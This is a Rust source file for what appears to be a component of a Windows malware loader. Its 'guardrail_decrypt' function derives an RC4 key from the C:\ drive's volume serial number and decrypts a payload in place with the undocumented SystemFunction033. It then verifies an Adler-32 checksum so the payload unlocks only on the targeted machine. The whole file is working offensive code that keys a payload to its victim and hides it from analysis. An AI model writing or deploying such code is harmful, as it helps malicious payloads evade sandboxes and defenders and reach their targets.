#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

use core::{ptr::{null, null_mut}};
use crystal_bindings::tcg::adler32sum;
use crystal_sdk::{import};
use winapi::{shared::{minwindef::{DWORD, LPDWORD}, ntdef::{LONG, LPCSTR, LPSTR}}};

#[derive(Default)]
#[repr(C)]
struct USTRING {
    length: DWORD,
    maxlen: DWORD,
    buffer: *mut u8
}

#[derive(Default)]
#[repr(C)]
struct ENVKEY {
    a: DWORD,
    b: DWORD,
}

#[derive(Default)]
#[repr(C)]
struct _VERIFY {
    check_sum: DWORD,
    value: [u8; 0],
}

import!(ADVAPI32!SystemFunction033(data: *mut USTRING, key: *mut USTRING) -> LONG);
import!(KERNEL32!GetVolumeInformationA(lpRootPathName: LPCSTR, lpVolumeNameBuffer: LPSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, 
    lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPSTR, nFileSystemNameSize: DWORD) -> i32);

fn derive_key_serial_no() -> ENVKEY {
    unsafe {
        let mut volume_serial_num = 0u32;

        /* get the volume serial number and copy it to our key buffer */
        GetVolumeInformationA(c"c:\\".as_ptr(), null_mut(), 0, &mut volume_serial_num, null_mut(), null_mut(), null_mut(), 0);

        /* we're going through this gymnastic because rc4 wants at least 40b (5 bytes) to encrypt. */
        let result = ENVKEY { 
            a: volume_serial_num, 
            b: volume_serial_num
        };

        result
    }
}

/*
 * We are going to accept a buffer from the parent loader, to give the parent control over
 * how to allocate (and free) the memory for our decryption.
 *
 * char * dst    - the destination where our decrypted payload will live
 *                 (note: we expect this buffer is pre-populated with our ciphertext, we
 *                  decrypt in place)
 * int    len    - the length of our ciphertext. It better be <= the size of dst.
 * int  * outlen - a ptr to a var to populate with the size of the decrypted content.
 *                 This parameter is optional and a NULL value is OK.
 *
 * Returns a pointer to the decrypted VALUE if successful
 * Returns NULL if decryption or verification failed
 */
#[unsafe(no_mangle)]
extern "C" fn guardrail_decrypt(dst: *mut u8, len: i32, outlen: *mut i32) -> *const u8 {
    unsafe {
        let mut key;
        let mut u_data = USTRING::default();
        let mut u_key = USTRING::default();
        let hdr: *const _VERIFY;
        let ddlen;
        let ddsum;

        /* This is where we bring our environment-derived key into the mix.
        * Here, we are using the c:\ drive's serial number as a simple key. */
        key = derive_key_serial_no();

        /* setup our USTRING data structures for RC4 decrypt */
        u_data.length = len as _;
        u_data.buffer = dst;

        u_key.length = size_of::<ENVKEY>() as _;
        u_key.buffer = &mut key as *mut _ as _;

        /* call the System033 function to do an RC4 decrypt */
        SystemFunction033(&mut u_data, &mut u_key);

        /* now, we need to *verify* our result. */
        hdr = dst as _;

        /* decrypted data length */
        ddlen = len - size_of::<DWORD>() as i32;

        /* store our output length too, if an outptr was provided */
        if !outlen.is_null() {
            *outlen = ddlen;
        }

        /* checksum for our decrypted data */
        ddsum = adler32sum((*hdr).value.as_ptr() as _, ddlen as _);

        /* this succeeded if the packed-in and calculcated checksums match */
        if (*hdr).check_sum == ddsum {
            return (*hdr).value.as_ptr();
        }
        null()
    }   
}
